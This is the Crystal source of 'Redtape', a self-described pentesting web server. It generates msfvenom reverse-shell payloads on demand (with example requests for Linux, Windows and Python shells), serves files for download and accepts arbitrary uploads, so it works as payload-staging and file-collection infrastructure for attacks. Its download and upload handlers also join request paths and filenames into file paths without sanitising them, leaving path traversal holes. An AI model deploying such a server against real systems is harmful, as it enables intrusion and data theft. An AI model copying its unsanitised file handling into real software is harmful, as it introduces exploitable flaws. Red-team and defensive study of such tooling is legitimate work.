require "http"
require "process"
require "option_parser"

ip = "0.0.0.0"
port = 80
downloadDir = "."
uploadDir = "."
quietMode = false

OptionParser.parse do |parser|
  parser.banner = "Redtape | Pentesting web server"

  parser.on "-l HOST", "--listen HOST", "Host to listen on" do |val|
    ip = val
  end

  parser.on "-p PORT", "--port PORT", "Port to listen on" do |val|
    port = val.to_i32
  end

  parser.on "-d DOWNLOAD_DIR", "--download_dir DOWNLOAD_DIR", "Directory to serve files from at /file/<file_name>. Defaults to working directory" do |dir|
    downloadDir = dir
  end

  parser.on "-u UPLOAD_DIR", "--upload_dir UPLOAD_DIR", "Directory to store uploaded files, defaults to working directory" do |dir|
    uploadDir = dir
  end

  parser.on "-q", "--quiet", "Don't output all requests to stdout" do
    quietMode = true
  end

  parser.on "-h", "--help", "Show help" do
    puts parser

    puts "\nRequest format: http://<host>:<port>/<COMMAND>?<OPTIONS>"

    puts "\nCOMMAND msfvenom"
    puts "\tGenerates an msfvenom payload and returns it as a file download."
    puts "\tOptions are passed as query parameters. You must pass PAYLOAD and LHOST."
    puts "\tWhen passing a PAYLOAD, you must pass either the full PAYLOAD ('linux/x64/shell_reverse_tcp') or " \
         "an OS. When specifying an OS, the payload is shell_revrese_tcp, with a default ARCH of x64."

    puts "\n\tEXAMPLE"
    puts "\n\tLinux default payload (shell_reverse_tcp), default ARCH (x64) and default PORT (4444)"
    puts "\tGET http://127.0.0.1/msfvenom?os=linux&format=elf&lhost=127.0.0.1"

    puts "\n\tWindows staged reverse TCP shell"
    puts "\tGET http://127.0.0.1/msfvenom?payload=windows/x86/shell/reverse_tcp&format=exe&lhost=127.0.0.1"

    puts "\n\tPython reverse UDP shell"
    puts "\tGET http://127.0.0.1/msfvenom?payload=python/shell_reverse_udp&lhost=192.168.45.100&lport=25565"

    puts "\nCOMMAND download"
    puts "Download a file from DOWNLOAD_DIR"

    puts "\n\tEXAMPLE"
    puts "\tDownload DOWNLOAD_DIR/file.txt"
    puts "\tGET http://127.0.0.1/download/file.txt"

    puts "\nCOMMAND upload"
    puts "Accepts a file via the form data of a POST request and saves it to UPLOAD_DIR."

    puts "\n\tEXAMPLE"
    puts "\tUpload a file. The filename should be automatically specified in the post data."
    puts "\tPOST http://127.0.0.1/upload"
    exit()
  end

  parser.missing_option do |option_flag|
    STDERR.puts "Flag #{option_flag} missing required value"
    exit(1)
  end

  parser.invalid_option do |option_flag|
    STDERR.puts "Invalid flag: #{option_flag}"
    exit(2)
  end
end

def send_file(context, path, nameOverride = nil)
  File.open(path, "rb") do |file|
    buf = Bytes.new(file.info.size)
    file.read buf

    filename = nameOverride || File.basename(path)
    context.response.headers["Content-Disposition"] = "attachment; filename=#{filename}"
    context.response.write buf
  end
end

def msfvenom_server(context)
  params = context.request.query_params
  payload = params["payload"]? ||
            "#{params["os"]? || "linux"}/#{params["arch"]? || "x64"}/shell_reverse_tcp"
  format = params["format"]?
  lport = params["lport"]? || "4444"
  lhost = params["lhost"]

  filePath = "#{Dir.tempdir}/redtape_#{Random.rand(0..Int32::MAX)}"
  args = [
    "-p", payload,
    "LHOST=#{lhost}",
    "LPORT=#{lport}",
    "-o", filePath,
  ]

  if format
    args.push "-f", format
  end

  Process.run("msfvenom", args)
  send_file context, filePath, payload.gsub("/", "_")
  File.delete filePath
rescue error
  STDERR.puts "Error: #{error}"
  context.response.status = HTTP::Status::BAD_REQUEST
  context.response.print error
end

def file_server(context, downloadDir)
  pathStartIndex = context.request.path.index("/", 1)
  puts pathStartIndex

  if pathStartIndex
    path = context.request.path[(pathStartIndex)..]
    send_file context, "#{downloadDir}/#{path}"
  else
    context.response.status = HTTP::Status::BAD_REQUEST
  end
rescue File::NotFoundError
  puts "notfound"
  context.response.status = HTTP::Status::NOT_FOUND
rescue error
  STDERR.puts "Error while sending file: #{error}"
  context.response.status = HTTP::Status::INTERNAL_SERVER_ERROR
end

def upload_server(context, uploadDir)
  HTTP::FormData.parse(context.request) do |part|
    case part.name
    when "file"
      print "Received file #{part.filename}"
      file = File.open("#{uploadDir}/#{part.filename}", "wb") do |file|
        IO.copy(part.body, file)
      end
    else
      puts "Unknown form data part #{part.name}"
    end
  end
rescue error
  STDERR.puts "Error while receiving file: #{error}"
end

server = HTTP::Server.new do |context|
  command = context.request.path.split("/")[1]
  puts context.request

  unless quietMode
    puts "#{context.request.remote_address} - #{context.request.method} #{context.request.path}"
  end

  case command
  when "msfvenom"
    msfvenom_server context
  when "download"
    file_server context, downloadDir
  when "upload"
    upload_server context, uploadDir
  else
    context.response.status = HTTP::Status::BAD_REQUEST
    context.response.print "Bad Request: unknown command #{command}"
  end
end

puts "DOWNLOAD_DIR #{File.realpath(downloadDir)}"
puts "UPLOAD_DIR #{File.realpath(uploadDir)}"

address = server.bind_tcp ip, port
puts "Listening on http://#{address}..."
server.listen
